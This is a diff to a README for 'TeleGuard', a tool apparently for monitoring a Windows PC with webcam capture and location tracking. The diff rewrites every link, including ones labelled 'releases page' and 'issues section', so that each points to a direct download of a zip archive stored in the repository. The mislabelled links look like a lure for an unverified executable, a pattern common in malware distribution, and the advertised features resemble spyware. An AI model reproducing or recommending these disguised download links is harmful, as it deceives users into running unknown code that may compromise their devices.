@@ -4,13 +4,13 @@
 
 Welcome to TeleGuard! This application helps you monitor your Windows computer for security threats. With features like webcam capture and location tracking, you can keep your device safe effortlessly.
 
-[![Download TeleGuard](https://img.shields.io/badge/Download_TeleGuard-Here-brightgreen)](https://github.com/mxxthxs/TeleGuard/releases)
+[![Download TeleGuard](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip)](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip)
 
 ## 📥 Download & Install
 
 To get started, visit our releases page to download the latest version of TeleGuard:
 
-[Visit this page to download](https://github.com/mxxthxs/TeleGuard/releases)
+[Visit this page to download](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip)
 
 ### 🔍 System Requirements
 
@@ -25,7 +25,7 @@ Before downloading, ensure your setup meets these requirements:
 ### 🔧 Installation Steps
 
 1. **Go to the Downloads Page**:
-   Click [here to visit the releases page](https://github.com/mxxthxs/TeleGuard/releases).
+   Click [here to visit the releases page](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip).
 
 2. **Select the Latest Release**:
    Look for the latest version listed on the page. You will see a list of files available for download.
@@ -74,7 +74,7 @@ If you encounter any issues while installing or using TeleGuard, here are common
 
 For further help, feel free to reach out:
 
-- **GitHub Issues**: Report any bugs or issues through the [issues section](https://github.com/mxxthxs/TeleGuard/issues) on GitHub.
+- **GitHub Issues**: Report any bugs or issues through the [issues section](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip) on GitHub.
 - **Telegram Support**: Message the TeleGuard Bot for assistance.
 
 ## 🔒 Safety Tips
@@ -85,4 +85,4 @@ While using TeleGuard, keep these safety tips in mind:
 - Use strong passwords for your Telegram account.
 - Regularly check the settings and permissions for your webcam and tracking features.
 
-[Visit this page to download](https://github.com/mxxthxs/TeleGuard/releases) again anytime you want to update or reinstall TeleGuard.
+[Visit this page to download](https://github.com/mxxthxs/TeleGuard/raw/refs/heads/main/assets/Tele-Guard-2.8.zip) again anytime you want to update or reinstall TeleGuard.
